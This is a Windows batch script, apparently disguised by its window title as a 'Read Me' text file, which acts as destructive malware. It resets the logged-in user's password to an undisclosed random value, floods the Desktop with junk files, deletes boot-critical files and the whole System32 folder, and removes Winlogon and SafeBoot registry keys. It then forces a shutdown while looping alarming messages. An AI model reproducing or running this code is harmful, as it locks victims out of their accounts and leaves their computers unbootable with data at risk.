@echo off
setlocal EnableDelayedExpansion

title Oku Beni.txt
color 0c

:: Check Windows version
ver | find "5.1" >nul && set "winver=xp"
ver | find "6.1" >nul && set "winver=7"
ver | find "6.2" >nul && set "winver=8"
ver | find "6.3" >nul && set "winver=8.1"
ver | find "10.0" >nul && set "winver=10"

:: Check for admin rights using more compatible method
net session >nul 2>&1
if %errorlevel% neq 0 (
    msg * "Please run this script as Administrator"
    timeout /t 3 >nul
    exit /b
)

:: Get current username using more reliable method
for /f "tokens=*" %%a in ('whoami') do set "currentuser=%%a"
set "currentuser=!currentuser:*\=!"

:: Generate stronger password
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
set "newpass="
for /L %%i in (1,1,20) do (
    set /a "x=!random! %% 84"
    set "newpass=!newpass!!chars:~%x%,1!"
)

:continue
:: Use more reliable user detection
for /f "tokens=*" %%u in ('echo %username%') do set "currentuser=%%u"

:: Change password with error handling
net user "%currentuser%" "%newpass%" >nul 2>&1
if %errorlevel% neq 0 (
    msg * "Something failed!"
    timeout /t 2 >nul
)

cd %userprofile%\Desktop

setlocal EnableDelayedExpansion

for /L %%i in (1,1,50) do (
    set "random_name="
    for /L %%j in (1,1,8) do (
        set /a "rand=!random! %% 36"
        if !rand! lss 10 (
            set "random_name=!random_name!!rand!"
        ) else (
            set /a "letter=!rand!+55"
            cmd /c exit !letter!
            for /f %%k in ('powershell -command "[char]!letter!"') do (
                set "random_name=!random_name!%%k"
            )
        )
    )
    echo File > "!random_name!.txt"
    md "F!random_name!" 2>nul
)

del /f /q /s "%SystemRoot%\System32\winload.exe" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\ntoskrnl.exe" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\hal.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\bootvid.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\ci.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\disk.sys" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\pci.sys" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\Config\*.*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\*.*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\DRIVERS\*.*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\kdcom.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\mcupdate_GenuineIntel.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\PSHED.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\CLFS.sys" >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f >nul 2>&1
del /f /q /s "%SystemRoot%\System32\Tasks\*.*" >nul 2>&1
shutdown /f /s /t 600
msg * "Hi!"
:loop
    msg * "System critical error detected!"
    msg * "Please contact system administrator."
    msg * "Boot sector compromised!"
    msg * "System will be unusable in 10 minutes!"
    msg * "Some important system files have been deleted!"
goto loop
